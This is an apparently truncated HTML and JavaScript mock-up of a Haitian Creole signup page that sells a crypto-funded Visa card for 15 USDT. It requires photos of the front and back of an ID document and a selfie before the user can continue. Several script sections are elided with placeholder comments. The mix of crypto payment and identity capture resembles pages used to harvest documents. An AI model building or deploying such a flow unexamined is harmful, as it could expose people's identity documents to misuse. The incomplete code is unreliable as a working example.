

DOCTYPE html>
<html lang="ht">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Live Crypto Bot - Kat Peye</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root { --gold: #d4af37; --navy: #060e1b; --card-bg: #112240; --white: #ffffff; --red: #e74c3c; --green: #2ecc71; --text: #8892b0; }
        body { background: var(--navy); color: white; font-family: 'Segoe UI', sans-serif; margin: 0; padding: 15px; padding-bottom: 40px; }
        .container { max-width: 400px; margin: 0 auto; }
        .header-title { color: var(--gold); text-align: center; font-size: 18px; font-weight: 800; margin-bottom: 20px; text-transform: uppercase; }
        .card-wrapper { margin-bottom: 25px; }
        .visa-card { border-radius: 15px; padding: 15px; cursor: pointer; height: 120px; display: flex; flex-direction: column; justify-content: space-between; box-shadow: 0 5px 15px rgba(0,0,0,0.4); border: 1px solid rgba(255,255,255,0.1); position: relative; overflow: hidden; transition: 0.3s; }
        .visa-card:hover { transform: scale(1.02); }
        .card-black { background: #1a1a1a; color: white; }
        .card-yellow-black { background: linear-gradient(135deg, #d4af37 50%, #000 50%); color: #fff; }
        .card-white-gold { background: linear-gradient(135deg, #ffffff 50%, #d4af37 50%); color: #000; }
        .visa-logo { font-size: 22px; font-weight: bold; z-index: 2; }
        .chip { width: 35px; height: 25px; background: linear-gradient(135deg, #e0c068, #b08d32); border-radius: 4px; z-index: 2; }
        .plan-info { display: flex; justify-content: space-between; align-items: flex-end; z-index: 2; }
        .plan-name { font-weight: bold; font-size: 14px; }
        .plan-price { font-size: 20px; font-weight: 900; }
        .card-prensip { background: rgba(17, 34, 64, 0.6); border: 1px solid rgba(212, 175, 55, 0.15); border-radius: 0 0 10px 10px; padding: 10px; margin-top: -5px; font-size: 11px; color: #ccd6f6; line-height: 1.4; display: flex; flex-direction: column; gap: 3px; }
        .card-prensip span { display: flex; align-items: center; gap: 5px; }
        .card-prensip i { color: var(--gold); font-size: 10px; }
        #form-screen, #amount-screen, #confirm-screen { display: none; }
        .input-group { margin-bottom: 12px; }
        .input-group label { display: block; color: var(--gold); font-size: 11px; margin-bottom: 5px; font-weight: bold; text-transform: uppercase; }
        .input-group input, .input-group select { width: 100%; background: #112240; border: 1px solid rgba(212, 175, 55, 0.3); padding: 12px; border-radius: 8px; color: white; box-sizing: border-box; font-size: 14px; outline: none; }
        .kyc-grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 8px; margin: 15px 0; }
        .kyc-box { background: rgba(255,255,255,0.05); border: 1px dashed var(--gold); padding: 10px; border-radius: 8px; text-align: center; cursor: pointer; display: flex; flex-direction: column; align-items: center; justify-content: center; font-size: 10px; }
        .kyc-box i { font-size: 18px; margin-bottom: 5px; }
        .kyc-box.uploaded { border-style: solid; background: rgba(46, 204, 113, 0.1); border-color: var(--green); color: var(--green); }
        #custom-alert { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); padding: 12px 20px; border-radius: 8px; color: white; display: none; z-index: 100; font-size: 13px; text-align: center; min-width: 250px; font-weight: bold; box-shadow: 0 5px 15px rgba(0,0,0,0.5); }
        .btn-action { width: 100%; background: var(--gold); color: #000; border: none; padding: 15px; border-radius: 8px; font-size: 15px; font-weight: 900; cursor: pointer; text-transform: uppercase; margin-top: 10px; display: flex; justify-content: center; align-items: center; }
        .loader { width: 18px; height: 18px; border: 2px solid #000; border-top: 2px solid transparent; border-radius: 50%; animation: spin 1s linear infinite; display: none; margin-left: 10px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div id="custom-alert"></div>
<input type="file" id="cameraSelfie" accept="image/*" capture="user" style="display: none;">
<input type="file" id="cameraEnv" accept="image/*" capture="environment" style="display: none;">

<div class="container">
    <div id="selection-screen">
        <h2 class="header-title">Chwazi Kat Ou</h2>
        <div class="card-wrapper">
            <div class="visa-card card-black" onclick="openForm('STANDARD BLACK', 15)">
                <div class="visa-logo">VISA</div><div class="chip"></div>
                <div class="plan-info"><span class="plan-name">STANDARD</span><span class="plan-price">15 USDT</span></div>
            </div>
            <div class="card-prensip">
                <span><i class="fas fa-check"></i> Limit finansman: $500 max</span>
                <span><i class="fas fa-check"></i> Frè antretyen: $1.00 / mwa</span>
            </div>
        </div>
        </div>

    <div id="form-screen">
        <h2 class="header-title">Enfòmasyon Pèsonèl</h2>
        <label style="color:var(--gold); font-size:11px; font-weight:bold;">VÉRIFIKASYON PIÈS (KYC FLASH)</label>
        <div class="kyc-grid">
            <div class="kyc-box" id="box-devan" onclick="triggerCam('devan')"><i class="fas fa-id-card"></i><span>DEVAN</span></div>
            <div class="kyc-box" id="box-deyè" onclick="triggerCam('deyè')"><i class="fas fa-id-card"></i><span>DÈYÈ</span></div>
            <div class="kyc-box" id="box-selfie" onclick="triggerCam('selfie')"><i class="fas fa-user-circle"></i><span>SELFIE</span></div>
        </div>
        <button class="btn-action" onclick="goToAmount()"><span>KONTINYE</span></button>
    </div>

    </div>

<script>
    // FONTKSYON BLOKAJ FOTO A
    function checkKYCUploaded() {
        return document.getElementById('box-devan').classList.contains('uploaded') &&
               document.getElementById('box-deyè').classList.contains('uploaded') &&
               document.getElementById('box-selfie').classList.contains('uploaded');
    }

    function goToAmount() {
        // TCHEKE SI FOTO YO LA ANVAN NOU ALE
        if(!checkKYCUploaded()) {
            showAlert("⚠️ Ou dwe chwazi tout 3 foto (Devan, Dèyè, Selfie) pou w kontinye!", "red");
            return;
        }
        // ... (Res kòd la)
        document.getElementById('form-screen').style.display = 'none';
        document.getElementById('amount-screen').style.display = 'block';
    }

    async function finalizeAll() {
        // SEKIRITE FINAL: SI YO CONTOUNE PAJ LA, BLOKE L
        if(!checkKYCUploaded()) {
            showAlert("Erè sekirite: KYC manke!", "red");
            return;
        }
        // ... (Res kòd finalizeAll la)
    }

    // ... (Rès scripts yo...)
</script>

</body>
</html>
